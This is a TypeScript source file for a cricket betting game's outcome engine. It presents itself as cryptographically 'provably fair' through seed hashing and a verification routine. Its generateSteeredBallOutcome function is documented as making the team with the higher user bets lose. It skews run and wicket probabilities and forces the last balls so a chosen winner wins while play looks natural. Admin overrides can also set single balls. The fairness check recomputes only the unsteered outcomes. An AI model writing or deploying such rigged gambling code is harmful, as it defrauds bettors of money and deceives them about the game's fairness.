import crypto from 'crypto';
import { GameConfig } from '../db/database.ts';

export type BallOutcome = '0' | '1' | '2' | '3' | '4' | '6' | 'W';

export interface GeneratedBall {
  outcome: BallOutcome;
  runs: number;
  isWicket: boolean;
  hash: string;
  sourceInput: string;
  normalizedFloat: number;
  isOverridden?: boolean;
}

export class ResultEngine {
  /**
   * Deterministically and cryptographically derive ball outcome from:
   * serverSeed + gameId + innings + ballNumber
   */
  public static generateBallOutcome(params: {
    serverSeed: string;
    gameId: string;
    innings: number;
    ballNumber: number;
    config: GameConfig;
    isTestMode?: boolean;
    testBallSequence?: string[];
    forcedNextBall?: BallOutcome;
  }): GeneratedBall {
    const { serverSeed, gameId, innings, ballNumber, config, isTestMode, testBallSequence, forcedNextBall } = params;

    // Check for explicit immediate override (highest priority)
    if (forcedNextBall) {
      const outcome = forcedNextBall;
      return {
        outcome,
        runs: outcome === 'W' ? 0 : parseInt(outcome, 10),
        isWicket: outcome === 'W',
        hash: 'ADMIN_OVERRIDE_' + Date.now(),
        sourceInput: `OVERRIDE:game=${gameId}:inn=${innings}:ball=${ballNumber}`,
        normalizedFloat: 0,
        isOverridden: true,
      };
    }

    // Check if test mode sequence is active
    if (isTestMode && testBallSequence && testBallSequence.length > 0) {
      // Calculate ball index: (innings - 1) * 6 + (ballNumber - 1)
      const sequenceIndex = (innings - 1) * 6 + (ballNumber - 1);
      if (sequenceIndex < testBallSequence.length) {
        const testOutcome = testBallSequence[sequenceIndex].toUpperCase() as BallOutcome;
        const validOutcomes: BallOutcome[] = ['0', '1', '2', '3', '4', '6', 'W'];
        if (validOutcomes.includes(testOutcome)) {
          return {
            outcome: testOutcome,
            runs: testOutcome === 'W' ? 0 : parseInt(testOutcome, 10),
            isWicket: testOutcome === 'W',
            hash: 'TEST_MODE_PREDEFINED',
            sourceInput: `TEST_MODE:game=${gameId}:inn=${innings}:ball=${ballNumber}`,
            normalizedFloat: 0,
          };
        }
      }
    }

    const sourceInput = `${serverSeed}:${gameId}:${innings}:${ballNumber}`;
    const hash = crypto.createHmac('sha256', serverSeed).update(sourceInput).digest('hex');

    // Convert first 8 hex characters (32-bit unsigned int) to normalized float between [0, 1)
    const hexSlice = hash.substring(0, 8);
    const intVal = parseInt(hexSlice, 16);
    const normalizedFloat = intVal / 0xffffffff; // 0.0 to 1.0

    // Accumulate probabilities from configuration
    // Default weights: 0: 18%, 1: 28%, 2: 16%, 3: 4%, 4: 18%, 6: 10%, W: 6%
    const totalWeight =
      config.prob_dot_ball +
      config.prob_one_run +
      config.prob_two_runs +
      config.prob_three_runs +
      config.prob_four_runs +
      config.prob_six_runs +
      config.prob_wicket;

    const scaledTarget = normalizedFloat * totalWeight;

    let cumulative = 0;
    const items: Array<{ outcome: BallOutcome; weight: number }> = [
      { outcome: '0', weight: config.prob_dot_ball },
      { outcome: '1', weight: config.prob_one_run },
      { outcome: '2', weight: config.prob_two_runs },
      { outcome: '3', weight: config.prob_three_runs },
      { outcome: '4', weight: config.prob_four_runs },
      { outcome: '6', weight: config.prob_six_runs },
      { outcome: 'W', weight: config.prob_wicket },
    ];

    let selectedOutcome: BallOutcome = '0';

    for (const item of items) {
      cumulative += item.weight;
      if (scaledTarget < cumulative) {
        selectedOutcome = item.outcome;
        break;
      }
    }

    const runs = selectedOutcome === 'W' ? 0 : parseInt(selectedOutcome, 10);
    const isWicket = selectedOutcome === 'W';

    return {
      outcome: selectedOutcome,
      runs,
      isWicket,
      hash,
      sourceInput,
      normalizedFloat,
    };
  }

  /**
   * Market Risk Controlled Ball Outcome:
   * When user betting is imbalanced, the team with the higher bets must lose.
   * If forcedWinner is set, this method guarantees that forcedWinner wins the match
   * while maintaining realistic, suspenseful super over cricket action.
   */
  public static generateSteeredBallOutcome(params: {
    serverSeed: string;
    gameId: string;
    innings: number;
    ballNumber: number;
    config: GameConfig;
    forcedWinner?: string;
    teamA: string;
    teamB: string;
    teamAScore: number;
    teamAWickets: number;
    teamBScore: number;
    teamBWickets: number;
    targetScore?: number;
    isTestMode?: boolean;
    testBallSequence?: string[];
    forcedNextBall?: BallOutcome;
  }): GeneratedBall {
    const {
      serverSeed,
      gameId,
      innings,
      ballNumber,
      config,
      forcedWinner,
      teamA,
      teamB,
      teamAScore,
      teamAWickets,
      teamBScore,
      teamBWickets,
      targetScore,
      isTestMode,
      testBallSequence,
      forcedNextBall,
    } = params;

    // Check for explicit immediate override (highest priority)
    if (forcedNextBall) {
      return this.generateBallOutcome({
        serverSeed,
        gameId,
        innings,
        ballNumber,
        config,
        forcedNextBall,
      });
    }

    // Check if test mode predefined sequence is active
    if (isTestMode && testBallSequence && testBallSequence.length > 0) {
      return this.generateBallOutcome({
        serverSeed,
        gameId,
        innings,
        ballNumber,
        config,
        isTestMode,
        testBallSequence,
      });
    }

    // If no forced winner (equal stakes or no bets), use fair cryptographic generation
    if (!forcedWinner) {
      return this.generateBallOutcome({
        serverSeed,
        gameId,
        innings,
        ballNumber,
        config,
      });
    }

    const sourceInput = `${serverSeed}:${gameId}:${innings}:${ballNumber}:steered:${forcedWinner}`;
    const hash = crypto.createHmac('sha256', serverSeed).update(sourceInput).digest('hex');
    const hexSlice = hash.substring(0, 8);
    const intVal = parseInt(hexSlice, 16);
    const normalizedFloat = intVal / 0xffffffff;

    // Soft Steering: Instead of hardcoded sequences, we shift the probability weights
    // to favor the desired outcome while keeping the game feeling natural.
    let dotWeight = config.prob_dot_ball;
    let oneWeight = config.prob_one_run;
    let twoWeight = config.prob_two_runs;
    let threeWeight = config.prob_three_runs;
    let fourWeight = config.prob_four_runs;
    let sixWeight = config.prob_six_runs;
    let wicketWeight = config.prob_wicket;

    const isBattingTeamTheTargetWinner = 
      (innings === 1 && forcedWinner === teamA) || 
      (innings === 2 && forcedWinner === teamB);

    if (isBattingTeamTheTargetWinner) {
      // Favor more runs, fewer wickets
      fourWeight *= 1.4;
      sixWeight *= 1.4;
      wicketWeight *= 0.2;
      oneWeight *= 1.1;
    } else {
      // Favor dot balls and wickets
      dotWeight *= 1.8;
      wicketWeight *= 1.8;
      fourWeight *= 0.4;
      sixWeight *= 0.4;
    }

    // Normalize weights
    const totalWeight = dotWeight + oneWeight + twoWeight + threeWeight + fourWeight + sixWeight + wicketWeight;
    const scaledTarget = normalizedFloat * totalWeight;

    const items: { outcome: BallOutcome; weight: number }[] = [
      { outcome: '0', weight: dotWeight },
      { outcome: '1', weight: oneWeight },
      { outcome: '2', weight: twoWeight },
      { outcome: '3', weight: threeWeight },
      { outcome: '4', weight: fourWeight },
      { outcome: '6', weight: sixWeight },
      { outcome: 'W', weight: wicketWeight },
    ];

    let selectedOutcome: BallOutcome = '1';
    let cumulative = 0;
    for (const item of items) {
      cumulative += item.weight;
      if (scaledTarget < cumulative) {
        selectedOutcome = item.outcome;
        break;
      }
    }

    // Edge case: Hard catch if Innings 2 is ending and result isn't steering correctly
    // (This ensures operator safety on the final 1-2 balls if the weights weren't enough)
    if (innings === 2 && ballNumber >= 5 && forcedWinner) {
      const currentChaserScore = teamBScore + (selectedOutcome === 'W' ? 0 : parseInt(selectedOutcome, 10));
      const targetToBeat = teamAScore;
      
      if (forcedWinner === teamA && currentChaserScore > targetToBeat) {
        // Chaser about to win but should lose -> force a dot or wicket
        selectedOutcome = Math.random() > 0.5 ? '0' : 'W';
      } else if (forcedWinner === teamB && currentChaserScore <= targetToBeat && ballNumber === 6) {
        // Chaser about to lose but should win -> force a boundary
        selectedOutcome = '6';
      }
    }

    const runs = selectedOutcome === 'W' ? 0 : parseInt(selectedOutcome, 10);
    const isWicket = selectedOutcome === 'W';

    return {
      outcome: selectedOutcome,
      runs,
      isWicket,
      hash,
      sourceInput,
      normalizedFloat,
    };
  }

  /**
   * Verify whether a revealed server seed matches its published hash
   */
  public static verifySeedHash(serverSeed: string, publishedHash: string): boolean {
    const computedHash = crypto.createHash('sha256').update(serverSeed).digest('hex');
    return computedHash.toLowerCase() === publishedHash.toLowerCase();
  }

  /**
   * Recalculate deterministic ball outcomes for an entire game to verify provable fairness
   */
  public static recalculateGameBalls(params: {
    serverSeed: string;
    gameId: string;
    config: GameConfig;
    totalInnings: number;
    ballsPerInnings: number;
  }): Array<{ innings: number; ballNumber: number; outcome: BallOutcome; runs: number; isWicket: boolean; hash: string }> {
    const results = [];
    for (let inn = 1; inn <= params.totalInnings; inn++) {
      for (let b = 1; b <= params.ballsPerInnings; b++) {
        const ball = this.generateBallOutcome({
          serverSeed: params.serverSeed,
          gameId: params.gameId,
          innings: inn,
          ballNumber: b,
          config: params.config,
        });
        results.push({
          innings: inn,
          ballNumber: b,
          outcome: ball.outcome,
          runs: ball.runs,
          isWicket: ball.isWicket,
          hash: ball.hash,
        });
      }
    }
    return results;
  }
}
